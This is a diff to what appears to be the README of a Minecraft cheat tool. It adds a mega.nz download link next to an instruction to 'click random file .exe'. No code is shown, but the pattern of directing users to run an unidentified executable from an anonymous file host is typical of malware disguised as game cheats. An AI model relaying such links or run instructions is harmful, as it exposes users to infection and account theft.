@@ -20,3 +20,4 @@ In "minecraft" folder
 * "hack" folder
   : Just click random file .exe and it should run the hack
   ,(Open Minecraft first)
+  * Download:https://mega.nz/file/70hnAA5R#jLvR-JKSeKUJLO517R-Lp0jLwdrN1CtjCCEV_CYoe9E
